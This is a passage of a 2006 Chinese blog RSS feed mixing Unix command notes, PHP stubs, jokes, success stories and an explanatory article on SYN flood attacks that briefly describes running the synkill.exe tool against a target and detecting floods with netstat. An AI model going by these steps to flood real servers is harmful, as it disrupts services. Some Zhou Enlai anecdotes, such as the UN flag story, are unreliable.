-U 只显示属于后面所跟用户名的进程的信息 屏幕控制命令 交换方式下，可以使用以下命令控制top ^L – 刷新屏幕 q – 退出 h or ? – 显示帮助 d – 修改刷新显示的次数 e – 显示最近”kill”或”renice”命令所产生的错误 i – 显示/不显示处于空闲的进程 I – 作用同 ‘i’ k – kill 进程; 发送一个信号到某个进程列表 n or # – 修改显示进程的数目 o – 以特定的字段排序 (pri, size, res, cpu, time) r – renice 一个进程 s – 修改输入的更新时间 u – 只显示属于某个用户的进程 (+ selects all users) 顺序显示下面三个常规的信息</description>
    </item>
    
    <item>
      <title>freebsd命令大全</title>
      <link>http://example.org/2006/10/16/freebsde591bde4bba4e5a4a7e585a8/</link>
      <pubDate>Mon, 16 Oct 2006 01:33:39 +0000</pubDate>
      
      <guid>http://example.org/2006/10/16/freebsde591bde4bba4e5a4a7e585a8/</guid>
      <description>1 man 在线查询 man ls
2 ls 查看目录与档案 ls -la 3 ln 建立链接文件 ln -fs /usr/local/apache/etc/httpd.conf /etc/httpd.conf
4 more 分页显示 more 文件名称
5 cd 切换目录 cd /usr/local/apache
6 mkdir 建立新的目录 mkdir /usr/temp
7 rmdir 删除目录 rmdir /usr/temp
8 rm 删除目录或档案 rm -f 文件名称
9 cp 复制目录或档案 cp 来源档案 目标档案
10 pwd 显示目前的工作目录 Pwd
11 mv 目录或档案更名或搬移 mv 来源档案 目标档案
12 find 寻找目录或档案 find /etc -name 文件名称
13 fetch 取得档案 fetch ftp://ftp.</description>
    </item>
    
    <item>
      <title>SYN攻击原理以及防范技术</title>
      <link>http://example.org/2006/10/15/syne694bbe587bbe58e9fe79086e4bba5e58f8ae998b2e88c83e68a80e69caf/</link>
      <pubDate>Sun, 15 Oct 2006 10:31:42 +0000</pubDate>
      
      <guid>http://example.org/2006/10/15/syne694bbe587bbe58e9fe79086e4bba5e58f8ae998b2e88c83e68a80e69caf/</guid>
      <description>本文介绍SYN攻击的基本原理、工具及检测方法，并全面探讨SYN攻击防范技术……
据统计，在所 TCP握手协议 有黑客攻击事件中，SYN攻击是最常见又最容易被利用的一种攻击手法。相信很多人还记得2000年YAHOO网站遭受的攻击事例，当时黑客利用的就是简单而有效的SYN攻击，有些网络蠕虫病毒配合SYN攻击造成更大的破坏。本文介绍SYN攻击的基本原理、工具及检测方法，并全面探讨SYN攻击防范技术。
一、TCP握手协议
在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。
第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；
第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；
第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。
完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：
未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 Backlog参数：表示未连接队列的最大容纳数目。
SYN-ACK 重传次数　服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。
半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间。
二、SYN攻击原理
SYN攻击属于DOS攻击的一种，它利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源。SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，只要这些系统打开TCP服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。配合IP欺骗，SYN攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。
三、SYN攻击工具
SYN攻击实现起来非常的简单，互联网上有大量现成的SYN攻击工具。
1、windows系统下的SYN工具
以synkill.exe为例，运行工具，选择随机的源地址和源端囗，并填写目标机器地址和TCP端囗，激活运行，很快就会发现目标系统运行缓慢。如果攻击效果不明显，可能是目标机器并未开启所填写的TCP端囗或者防火墙拒绝访问该端囗，此时可选择允许访问的TCP端囗，通常，windows系统开放tcp139端囗，UNIX系统开放tcp7、21、23等端囗。
四、检测SYN攻击
检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。我们使用系统自带的netstat 工具来检测SYN攻击：
# netstat -n -p TCP tcp　0　0 10.11.11.11:23　124.173.152.8:25882　SYN_RECV　- tcp　0　0 10.11.11.11:23　236.15.133.204:2577　SYN_RECV　- tcp　0　0 10.11.11.11:23　127.160.6.129:51748　SYN_RECV　- tcp　0　0 10.11.11.11:23　222.220.13.25:47393　SYN_RECV　- tcp　0　0 10.11.11.11:23　212.200.204.182:60427 SYN_RECV　- tcp　0　0 10.11.11.11:23　232.115.18.38:278　SYN_RECV　- tcp　0　0 10.</description>
    </item>
    
    <item>
      <title>freebsd cp命令</title>
      <link>http://example.org/2006/10/15/freebsd-cpe591bde4bba4/</link>
      <pubDate>Sun, 15 Oct 2006 08:19:22 +0000</pubDate>
      
      <guid>http://example.org/2006/10/15/freebsd-cpe591bde4bba4/</guid>
      <description>文件 cp xx /xx/xx
文件夹 cp -Rp xx /xxx/xxx</description>
    </item>
    
    <item>
      <title>中外人士对周总理的评价</title>
      <link>http://example.org/2006/09/27/e4b8ade5a496e4babae5a3abe5afb9e591a8e680bbe79086e79a84e8af84e4bbb7/</link>
      <pubDate>Wed, 27 Sep 2006 04:59:13 +0000</pubDate>
      
      <guid>http://example.org/2006/09/27/e4b8ade5a496e4babae5a3abe5afb9e591a8e680bbe79086e79a84e8af84e4bbb7/</guid>
      <description>外国朋友： 1、联合国前秘书长哈马啥尔德于1955年在北京会见过周总理后说过一句广为流传的话：“与周恩来相比，我们简直就是野蛮人。” 2、美国前总统尼克松亲自为周总理脱大衣，时间：1972年2月22日上午，地点：北京钓鱼台国宾馆。 3、美国前总统尼克松说：“中国如果没有毛泽东就可能不会燃起革命之火；如果没有周恩来，就会烧成灰烬。” 4、印度尼西亚前总统苏加诺说：“毛主席真幸运，有周恩来这样一位总理，我要是有周恩来这样一位总理就好了。” 5、建国前，斯大林和米高扬也说过：“你们在筹建政府方面不会有麻烦，因为你们有现成的一位总理，周恩来。你们到哪里去找这样好的总理呢？” 6、苏联前总理柯西金对毛主席说：“像周恩来这样的同志是无法战胜的，他是全世界最大的政治家。”末了，他又补了一句：“前天美国报纸上登的。” 7、苏联总理柯西金在会见日本创价协会会长池田大作时说：“请你转告周总理，周总理是绝顶聪明的人，只要他在世一天，我们是不会进攻的，也不可能进攻的。” 8、英国前外交大臣艾登对美国记者说：“你们早晚会知道，周恩来可不是平凡的人。” 8、苏联前外交部长莫洛托夫对西方记者说：“你们认为我是难以对付的话，那你们就等着与周恩来打交道吧。” 9、印度印中友协会长说；“世界上的领导人，能多一些像周总理的，世界和平就有希望了”。在国内也同样，要是能多几个像周总理这样的领袖和GCD员，国家就会很好了。 10、肯尼迪夫人杰奎琳说：“全世界我只崇拜一个人，那就是周恩来。” 11、西哈努克夫人莫尼克公主也说过：“周恩来是我唯一的偶像！”
中国人： 1、两弹元勋钱学森说：“许多党外人士说，我们是认识周恩来才认识GCD的，相信周恩来才相信GCD的。” 2、原国家主席李先念说：“中国GCD因为有周恩来而增添了光辉，中国人民因为有周恩来而增强了自豪感。” 3、著名作家冰心老人说：“周恩来总理是十亿中国人民心目中的第一位完人。” 4、胡耀邦同志于1984年瞻仰了江苏淮安周恩来纪念馆后题词：“全党楷模”。 5、毛泽东于1974年在长沙对王洪文说：“对周恩来的任何攻击，必将遭到人民的坚决反对，” 6、文革中当红卫兵向毛泽东提出批斗周恩来的要求时，毛泽东说：“好吧，让我也去陪斗吧！” 7、文革中极左分子提出要批判周恩来时，毛泽东又说：“周总理打倒了，哪谁来治理国家呢？根本办不到。反周民必反。” 8、国民党元老于右任和蔡元培说：“周恩来先生的人格真是伟大！” 9、著名经济学家、人口学家、原北大校长马寅初说：“周恩来总理是最得民心的GCD员。” 10、著名地质专家李四光曾说：“周恩来是个了不起的人物，他胸怀宽阔，不计恩怨，广交朋友，用人唯贤，关心体贴，无微不至，为中国GCD团结了一大批人”。 11、陈云、彭真、宋庆龄、叶剑英、罗瑞卿、余秋里、谷牧说：“没有周总理，‘文化大革命’的后果不堪设想。” 12、更多的人说：周恩来是中国GCD的楷模、中华人民共和国的代表、中国GCD的一面旗帜、是中国人民心中的一座丰碑、是中国GCD的优良作风和传统的化身，密切联系群众的光辉典范、是人民的好总理、是中国人民的骄傲。 13.国民党高层军政要员盛赞周恩来： 李宗仁说：“周恩来作为国共和谈的首席代表，高瞻远瞩，立地生辉，抛开国共两党各自的信仰不说，仅以有这样的杰出领袖人物来看，GCD的胜利，也是天经地义的，顺乎情理！” 阎锡山说：“周恩来乃神才也！，周恩来先生的确是个大人才，我在国民党里没见过，国民党里没有这样的人才。” 张治中说：“我的一切进步与我的老朋友周恩来的帮助、教育是分不开的，我永远不会忘记他的情怀，他那广泛团结人的思想是国人学习的楷模。” 于右任说：“周恩来的人格真是伟大”！ 冯玉祥评价说：“极精明细密，殊可敬可佩也”！
见过周恩来后，在日记里写自己是吃饭太多。 古耕虞说：“国民党把我往外推，GCD把我往里拉，其代表人物就是周恩来”。 “是周恩来的力量，使我改变了对国共两党不偏不倚的立场，逐步靠拢GCD”
国民党内传言：得周恩来者得天下，委员长若有周辅佐，何至于有今天的局面（重庆谈判） 一个作者：记得著名影星秦怡被关起来后,孩子在家没有人管.有一天总理从他家门前过,偶然看到秦怡的孩子,一问才知道这回事,他马上指示手下办事人员与相关部门联系,给孩子安排个地方.秦怡出来后,感动不已,她没有想到一国总理居然关心到这样的小事. 人民的事,没有小事,我们的总理心里全是人民,所以在在处处会体现出他的关爱,这于他似乎是再正常不过的事了. 我们这代人经过了文化革命,又经过了文化革命的反思,我们知道周恩来确实是千古以来少有的好人,好总理.我不指望一些年轻人一下子理解他,但希望大家多看看正反两方面的意见,再进行认真的比较,我相信任何一下有带有偏见的人都会最终承认周总理是中华民族的骄傲,是集智慧,风采,操行,才干于一身的少见的完人.
联合国： 周总理死后，联合国降半旗（不是联合国旗降半，而是所有联合国会员国国旗全降半旗）。其中有一些国家的领袖不高兴了，说：“为什么不给我们国家死去的领袖降半旗？”当时的联合国秘书长在联合国会议上发表讲话说：“如果你们国家的领袖可以掌管世界上五分之一的人口却无儿无女，如果你们国家的领袖可以在海外没有一分钱的存款，谁做的到的，我也给降半旗。” 所有人都鸦雀无声。</description>
    </item>
    
    <item>
      <title>其实,其实很多女孩子都不知道……</title>
      <link>http://example.org/2006/09/22/e585b6e5ae9ee585b6e5ae9ee5be88e5a49ae5a5b3e5ada9e5ad90e983bde4b88de79fa5e98193e280a6e280a6-2/</link>
      <pubDate>Fri, 22 Sep 2006 01:43:17 +0000</pubDate>
      
      <guid>http://example.org/2006/09/22/e585b6e5ae9ee585b6e5ae9ee5be88e5a49ae5a5b3e5ada9e5ad90e983bde4b88de79fa5e98193e280a6e280a6-2/</guid>
      <description>其实很多女孩子都不知道，虽然很长时间没见面，但你会发现他手机里保存的可全都是你发 给他的昧暖短信…… 其实很多女孩子都不知道，他故意要你唱歌给他听，实际是喜欢你在和他温柔的争执表 现出来的可爱脾气…… 其实很多女孩子都不知道，虽然他嘴上说不在乎你跟别的男孩交往，可每当有陌生男人 和你接触时，他总会偷偷地将眉毛紧锁，那是因为他在乎你…… 其实很多女孩子都不知道，他并不怕你生气，只是怕你生了气、发过脾气后依然不理他 ，男孩的感情也同样细腻易碎啊…… 其实很多女孩子都不知道，每天他脑子里装的全是你，就连走路都不小心摔了个跟头， 当他起来拍拍身上的灰尘，嘴角也会依然挂着微笑，那是因为他在惦记着你…… 其实很多女孩子都不知道，有些话只说一遍就够了，因为你已经了解他，说多了，他会 觉得不珍贵的…… 其实很多女孩子都不知道，他去机场接你不会像你期望中的那样——捧着玫瑰大声叫“ 亲爱的”，他只是自然地接过你的行李，然后用眼睛抱紧你似的心疼说：“哎，怎么搞的， 怎么瘦得像豆芽菜了？” 其实很多女孩子都不知道，当你发脾气时，他却只会不做声地等你把火发完，最后慢慢 说：“你明天有课，早点睡吧……” 其实很多女孩子都不知道，他总是叫你小姑娘，可是每次做什么重大决定前，他却总想 先听听你的建议…… 其实很多女孩子都不知道，他不喜欢玩具小毛熊，但却一直把你送给他的小熊放在床头 …… 其实很多女孩子都不知道，他很想很想你时，也会买玫瑰送你，然后傻傻地等你，却不 知道自己捧的是月季；不过没关系，在他的心里——送的依然是玫瑰…… 其实很多女孩子都不知道，即便他嘴巴不甜，但他的吻却可以传递他所有对你的热情… … 其实很多女孩子都不知道，当你柔声细语对他讲很“酸”的话时，他反而会装得很正经 ，不过心里很甜很甜…… 其实很多女孩子都不知道，如果不能经常见到你，他会让自己忙碌起来，为的是不去想 你，因为他知道一想你将一发不可收拾…… 其实很多女孩子都不知道，他会把你的相片放在他钱包里，这样就可以时刻陪伴着你… … 其实很多女孩子都不知道，公车上他喜欢和你在一起拥挤，那是因为他喜欢听你近距离 的呼吸…… 其实很多女孩子都不知道，如果他在吃饭的时候目光呆滞，那是因为对面没有了你，他 嘴里的饭是没有滋味滴…… 其实很多女孩子都不知道，他会省下吃饭的钱，打个电话给远方的你…… 其实很多女孩子都不知道，他会把别的女孩子写给他的情书偷偷藏起，因为他的心里只 有你…… 其实很多女孩子都不知道，自从认识你以来，他每天的生活都会很积极，因为他希望自 己爱的女孩看到的是阳光的自己…… 其实很多女孩子都不知道，他会数着星星找你的星座，因为你勾起了他漫漫的思绪……
其实很多女孩子都不知道，他不会轻易把自己脆弱一面展现给你，虽然他还不能给予你 什么，但他会尽最大努力来保护你…… 其实很多女孩子都不知道，他也会在他最最无助的时候想起你，当然，不是想要你帮他 什么，只是希望你不要担心他…… 其实很多女孩子都不知道，虽然他很少当面赞美你，可是在他心里你肯定是他最棒的… … 其实很多女孩子都不知道，他会默默地记住你在不经意时说过的一些话，并在某时某刻 不断地在心里重复它们…… 其实很多女孩子都不知道，他从不会轻易地在你面前做出承诺，因为他想让自己成为你 心中说话最算话的男子汉，只想给你最可靠最安全的幸福…… 其实很多女孩子都不知道，他总告诉你不要胡思乱想，实际他已为你谋划出最美丽的未 来，让你无忧无虑地等待他要给你的惊喜…… 其实很多女孩子都不知道，也许他不像你那样能够清楚地记得某些纪念日，因为他觉得 爱你应该是每时每刻的，而不是靠这几天简单的日子……
女孩们，男孩子是不会轻易哭泣的，只有面对你最爱的人时，才会变得如此脆弱； 女孩们，男孩子是不会轻易哭泣的，只有在太爱她的时候，才会放下男人的自尊。 女孩们，如果有个男孩正为你哭泣，那么请你拉住他的手，也许他真的可以陪你走完一 生； 女孩们，如果有个男孩正为你哭泣，那么请不要放弃他，也许你的一个选择会毁掉一个 人！
他真是那个不在乎你过去的男孩； 他真是那个每天风雨无阻接你上下班的男孩； 他真是每天晚上在床上和你一起数星星的那个男孩； 他真是愿意为你付出一切的那个男孩； 他真是心疼你做饭，自己偷偷学做饭，让你感到惊喜的那个男孩； 他真是不向你隐瞒他以前过去往事的那个男孩； 他真是当你受委屈最想见到的那个男孩； 他真是不求回报，只想为你默默付出的那个男孩； 他真是爱你但不溺爱你，宠你但不惯你的那个男孩； 他真是能给你自由，给你足够安全感的那个男孩； 他真是当你开心时陪你开心，不开心时哄你开心的那个男孩； 他真是当你失去才后悔没去珍惜的那个男孩； 他真是拥有他的时候没觉得他好，失去他的时候才想他种种好处的那个男孩； 他真是每当他应酬的时候能让你放心的那个男孩； 他真是每天拼命赚钱让你过的更好的那个男孩； 他真是那个有什么好东西都留给你，愿意为你无偿奉献的那个男孩！</description>
    </item>
    
    <item>
      <title>今天觉得不爽！</title>
      <link>http://example.org/2006/09/06/e4bb8ae5a4a9e8a789e5be97e4b88de788bdefbc81/</link>
      <pubDate>Wed, 06 Sep 2006 10:20:30 +0000</pubDate>
      
      <guid>http://example.org/2006/09/06/e4bb8ae5a4a9e8a789e5be97e4b88de788bdefbc81/</guid>
      <description>觉得太不顺心了，我看我在这里也就这样了，不知几个月后会怎么样，明天还要完成项目，，唉，回去想吧！想吧！想吧！</description>
    </item>
    
    <item>
      <title>今天ＰＰ帮忙的!</title>
      <link>http://example.org/2006/09/05/e4bb8ae5a4a9efbd90efbd90e5b8aee5bf99e79a84/</link>
      <pubDate>Tue, 05 Sep 2006 07:25:25 +0000</pubDate>
      
      <guid>http://example.org/2006/09/05/e4bb8ae5a4a9efbd90efbd90e5b8aee5bf99e79a84/</guid>
      <description>count(distinct a.id) as count
以前还真没这么用过</description>
    </item>
    
    <item>
      <title>救落水美女注意事项</title>
      <link>http://example.org/2006/08/31/e69591e890bde6b0b4e7be8ee5a5b3e6b3a8e6848fe4ba8be9a1b9/</link>
      <pubDate>Thu, 31 Aug 2006 09:47:27 +0000</pubDate>
      
      <guid>http://example.org/2006/08/31/e69591e890bde6b0b4e7be8ee5a5b3e6b3a8e6848fe4ba8be9a1b9/</guid>
      <description>1、先确认落水美女的真实性―――不是正在游泳和洗澡的MM，
2、跳水时姿势不要追求&amp;quot;帅&amp;quot;而使用高难度的动作，如107B、207C等，否则会因为不熟悉水的深度而扎入泥中。
3、入水前为了减重可以脱掉一些衣服，但内裤需要穿在身上，不然你的动机就值得怀疑。
4、有两种泳姿最好不要使用，A)仰泳：不容易发现目标，还容易撞到礁石；B)狗刨：姿势过于恶劣，容易被其他人当作被救对象。
5、游到美女旁边时，一定要坚定意志，无论她多么主动也不要和她拥抱，不然你俩就是沉鱼落雁。
6、上岸后，不管多累也要抢着为美女做人工呼吸，要不所有努力宣告白费。
7、事后如果美女不同意嫁给你，第二天继续到河边蹲点―――等下一个！</description>
    </item>
    
    <item>
      <title>现在的女孩子满脑子都是色情~~</title>
      <link>http://example.org/2006/08/30/e78eb0e59ca8e79a84e5a5b3e5ada9e5ad90e6bba1e88491e5ad90e983bde698afe889b2e68385/</link>
      <pubDate>Wed, 30 Aug 2006 07:23:44 +0000</pubDate>
      
      <guid>http://example.org/2006/08/30/e78eb0e59ca8e79a84e5a5b3e5ada9e5ad90e6bba1e88491e5ad90e983bde698afe889b2e68385/</guid>
      <description>会错意(一) 下午coffee time,总经理走近四个女同事旁,“美丽小姐儿们,要不要猜谜啊？ 嘻嘻……好啦注意听,猜人身上的东西： 上面有毛,下面也有毛,晚上就来个毛对毛。” “唉呀呀,总经理好色,人家不来了啦！” “喂喂,别想歪了,答案是‘眼睛’”
会错意(二) 打卡时,总经理对女同事们说：“美丽的小姐们！要不要来个脑筋急转弯？” 众脂粉们心想,又来了。 听好喔：“什么东西最硬？女孩子最喜欢,特别是结了婚的女人,更是爱死了。脑筋急转弯！开始！” 众脂粉们又开始脸红了,低头都想走开。 “喂喂！还没说出答案啊？” “不来了啦,总经理你最色了啦！”　“喂喂！又想到哪去了？ 答案是【钻石】啦！”
会错意(三) “总经理！今天不玩猜谜啦？” “这个很难猜,你们一定猜不出来。” “哼？谁说的？”众小姐们不服输地娇嗔着。 好！那仔细听好。 猜人类的一种东西：“一种玩意儿,可长可短,西方人比较长,东方人比较短。” 众小姐又开始脸红了,开始故作娇羞状。 “唉呀！讨厌啦！再给一些提示嘛？” “好好,提示：结婚后,妻子就可用丈夫的这个东西。” “唉呀呀,为什么结婚前就不能用？”一位稍八婆的mm挑逗问道。 “如果硬要用,会让人耻笑：成何体统？” “唉呀！讨厌啦！再给一些提示嘛”众小姐又在故作矜持。 “好好,提示：出家人都不会用它。” “那…那……尼姑会想到用它吗？”那mm再问。 “尼姑也不用,她们用更长更长的东东。” “哇！哇？”众小姐发出无比羡慕渴望的娇呼声。 “怎样？猜不出来吧？很难猜,你们就不信。” “它是不是有时大？有时小？”还是那个mm在问。 “嗯？？没错！当看他比较大,你就说他是：【大】那个;如果 看他比较小,你就说他是：【小】那个,像最近打职棒的就用大小来分。” “唉呀呀！好下流,用【这个】来分？”众小姐低声议论纷纷。 众小姐早已认定答案就是“那个”,只是羞得说不出口。 忽见窗外,董事长座车驶进大门了,众小姐赶紧要回位子了。 “喂喂！ 们还没猜出来啊？” “唉呀！不来了啦！总经理好色！” “喂喂！想到哪去了！答案是姓名的【姓】啊。”
会错意(四) 总经理又在玩猜谜的玩意儿。 “各位美丽的小姐儿们,猜个谜语吧？猜人身上的一种东西： 舔也硬,不舔也硬,要舒服睡觉,先搓搓它” 众小姐又开始脸红了…… “唉呀！不来了啦！总经理好色！” “喂喂！想到哪儿去了！答案是【牙齿】啦。”
会错意(五) “各位美丽的小姐儿们,猜个谜语吧？仔细听好猜一句成语喔！总不会再想歪了吧： 心里很想要,好想要,好兴奋,又想得要命,结果洞口就慢慢开始流出水来了。” “唉呀！妈呀！这么不要脸的总经理。”小姐们心里如此骂着！ “怎样？猜不到了吧！嘿嘿嘿！” “那个…那个是不是会张很开？”38婆故作羞赧地问道。 “没错！而且都一直大大张开着。而且水流得更多。” “讨厌啦！讨厌啦！不来了啦！总经理好色。” “喂喂！猜不来就别乱讲,答案是【垂涎三尺】啦。”
会错意(七) “嗨！美丽的小姐儿们！” “总经理好！今天还要猜谜吗？” “不啦！每次都说我好色,不要了啦！”总经理满脸无辜样子。 “好嘛好嘛！我们不说就是了嘛。” “那么,今儿来猜一种【人的动作】。” “仔细听好：【下班以后最想做的事,一根硬梆梆的长条东西,直直地插进洞里,快的话,两下就好了。不然就抽出来,再插进去。不达目的绝不终止。 猜猜看是什么？“ “唉呀！夭寿啊！还说不色？这次这么粗鲁下流”众小姐都作如是想。 小姐们的脸一个比一个还红,真是假装羞死了。 “小孩子可不可以做？”38婆又问了。 “最好不要,出事大人要负责的。” “白天晚上都可以吗？”还是38婆在问。 嗯！通常都在晚上,白天也可以。不过白天看得较清楚,晚上乌漆妈黑的,好一边摸着,一边再插进去。 “哇！还说不色！”小姐们一边脸红,一边闷声嗤笑。 “还猜不出来？好吧！再给提示：最好不要发生那种让别人胡乱插进去的事,否则要出事的！” “讨厌！不来了啦！总经理好色。” “喂喂！猜不来就不要乱栽赃抹黄！答案是【用钥匙开门】啦！”</description>
    </item>
    
    <item>
      <title>php通用检测函数集</title>
      <link>http://example.org/2006/08/25/phpe9809ae794a8e6a380e6b58be587bde695b0e99b86/</link>
      <pubDate>Fri, 25 Aug 2006 09:14:58 +0000</pubDate>
      
      <guid>http://example.org/2006/08/25/phpe9809ae794a8e6a380e6b58be587bde695b0e99b86/</guid>
      <description>//转载：arcow的专栏 // ※CheckMoney($C_Money) 检查数据是否是99999.99格式 // ※CheckEmailAddr($C_mailaddr) 判断是否为有效邮件地址 // ※CheckWebAddr($C_weburl) 判断是否为有效网址 // ※CheckEmpty($C_char) 判断字符串是否为空 // ※CheckLengthBetween($C_char, $I_len1, $I_len2=100) 判断是否为指定长度内字符串 // ※CheckUser($C_user) 判断是否为合法用户名 // ※CheckPassword($C_passwd) 判断是否为合法用户密码 // ※CheckTelephone($C_telephone) 判断是否为合法电话号码 // ※CheckValueBetween($N_var, $N_val1, $N_val2) 判断是否是某一范围内的合法值 // ※CheckPost($C_post) 判断是否为合法邮编（固定长度） // ※CheckExtendName($C_filename,$A_extend) 判断上传文件的扩展名 // ※CheckImageSize($ImageFileName,$LimitSize) 检验上传图片的大小 // ※AlertExit($C_alert,$I_goback=0) 非法操作警告并退出 // ※Alert($C_alert,$I_goback=0) 非法操作警告 // ※ReplaceSpacialChar($C_char) 特殊字符替换函数 // ※ExchangeMoney($N_money) 资金转换函数 // ※WindowLocation($C_url,$C_get=&amp;quot;&amp;quot;,$C_getOther=&amp;quot;&amp;quot;) PHP中的window.location函数 //&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; &amp;mdash;&amp;mdash;-
//----------------------------------------------------------------------------------- ------- // 函数名：CheckMoney($C_Money) // 作 用：检查数据是否是99999.99格式 // 参 数：$C_Money（待检测的数字） // 返回值：布尔值 // 备 注：无 //----------------------------------------------------------------------------------- ------- function CheckMoney($C_Money) { if (!</description>
    </item>
    
    <item>
      <title>当前提升博客访问量的十大绝招!</title>
      <link>http://example.org/2006/08/25/e5bd93e5898de68f90e58d87e58d9ae5aea2e8aebfe997aee9878fe79a84e58d81e5a4a7e7bb9de68b9b/</link>
      <pubDate>Fri, 25 Aug 2006 06:42:47 +0000</pubDate>
      
      <guid>http://example.org/2006/08/25/e5bd93e5898de68f90e58d87e58d9ae5aea2e8aebfe997aee9878fe79a84e58d81e5a4a7e7bb9de68b9b/</guid>
      <description>你想提升你的博客访问量吗?? 经过这么一年的积累，阅博无数的情况下,我终于总结出了十大绝招。以表娱乐。
１，赞扬百度，说百度多么的公正，技术多么先进。
－文章一出，立即有一帮人用口水淹死你。 ２，写你是怎样将一热门关键词排到google的第一名的？ －保证有无数人慕名而来。
３，一天骂一人。当前谁最火你就骂谁。 －学习宋祖德
４，天天写文章说你自己多么伟大和高尚 －脸皮要象芙蓉姐姐一样　５，找个美女合作，你写文章，挂她的名字和照片 －不火也难
６。keso评论别人，你每天只管再评论keso。 －越快越好，keso文章一出，你的评论立即诞生
７，介绍实施各种各样的“流氓式”营销的实际操作经验 －保证比网络营销，搜索引擎营销还火
８，对外高调宣布，谁敢访问你的博客，你就要起诉谁
９，告诉别人你是如何通过QQ找到一夜情的 －需要现身说法的
１０，不断提供非常有新意和有远见的相关分析或专业知识。</description>
    </item>
    
    <item>
      <title>29 岁前你想成富翁吗？</title>
      <link>http://example.org/2006/08/22/29-e5b281e5898de4bda0e683b3e68890e5af8ce7bf81e59097efbc9f/</link>
      <pubDate>Tue, 22 Aug 2006 03:38:37 +0000</pubDate>
      
      <guid>http://example.org/2006/08/22/29-e5b281e5898de4bda0e683b3e68890e5af8ce7bf81e59097efbc9f/</guid>
      <description>最近流行一种说法，即 29 岁以前，属于青春 &amp;quot; 保质期 &amp;quot; ， 29 岁以后，就 Time out （过期）了，所谓的 29 岁现象。因此，如要在青春岁月里有所突破，创出一翻事业来，就宜赶在青春 &amp;quot; 过期 &amp;quot; 之前。张爱玲说： &amp;quot; 成名要趁早。 &amp;quot; 致富亦然。你是否想在 29 岁前成为富翁呢，请看几位年轻百万富翁的创业真经吧！
创业者的第一素质是商业能力
哈拉里， 27 岁；瓦拉迪， 29 岁；拉比， 28 岁。加拿大多伦多 Spin master 玩具公司的创始人。该公司创立于 1994 年， 1998 年销售额是 200 万美元， 1999 年销售额已达 420 万美元。
1991 年，哈拉里和拉比这对恋人在西安大略大学读绘画艺术，并沉浸在招贴画的艺术灵感之中。有一天，拉比突发想像，这么精美的艺术作品，何不将画拿出去卖钱？两人一拍即合。没想到一张招贴画竟卖了 5 个美元！ 5 美元不多，但意义非同小可。从卖出第一幅校园招贴画开始，他们就确信，未来的唯一选择就是做一个创业者了，因为他们从交易中找到了成功的感觉，发现了自己除具有技术能力外，还具有非凡的商业能力！而这些是一个创业者必备的素质，尤其是商业能力更是创业者必备的第一素质。我们许多年轻的创业者，往往容易轻忽这一点，以为在技术方面超群，在商业上也能拔萃，而疏忽了商业能力的培育和发掘。许多创业者在这一点上是有切肤之痛的。
因此，创业者从细小的生存细节，了解自己的潜质，确立自己的创业方向，是至关重要的一步。当然，有技术而无经营头脑并不要紧，你还可以请有这方面才华的人加盟做你的 CEO ！哈拉里和拉比虽然有商业头脑，但仍不忘邀更出色的人加盟呢。
1994 年，哈拉里和拉比毕业后，用卖招贴画所挣的 1 万美元投资制造了一种叫 &amp;quot; 地球伙伴 &amp;quot; 的玻璃头饰，一个月的销售额就达 100 万美元。后来，他们认识了学国际商贸的瓦拉迪。瓦拉迪的加盟又使他们如虎添翼，在技术上不断创新，在业务上不断拓展，生意十分红火。
拉比回忆道： &amp;quot; 在创业的前一年半中，我要做的事情就是坚持，以及满足突如其来的大量需求。 &amp;quot; 继 &amp;quot; 地球伙伴 &amp;quot; 的成功之后，他们设计的另外两种产品 - 一魔棍橡胶水玩具也大受欢迎，而 1998 年生产的空压动力玩具飞机更是风靡欧美。</description>
    </item>
    
    <item>
      <title>94年北京建国门事件解密</title>
      <link>http://example.org/2006/08/21/94e5b9b4e58c97e4baace5bbbae59bbde997a8e4ba8be4bbb6e8a7a3e5af86/</link>
      <pubDate>Mon, 21 Aug 2006 07:04:01 +0000</pubDate>
      
      <guid>http://example.org/2006/08/21/94e5b9b4e58c97e4baace5bbbae59bbde997a8e4ba8be4bbb6e8a7a3e5af86/</guid>
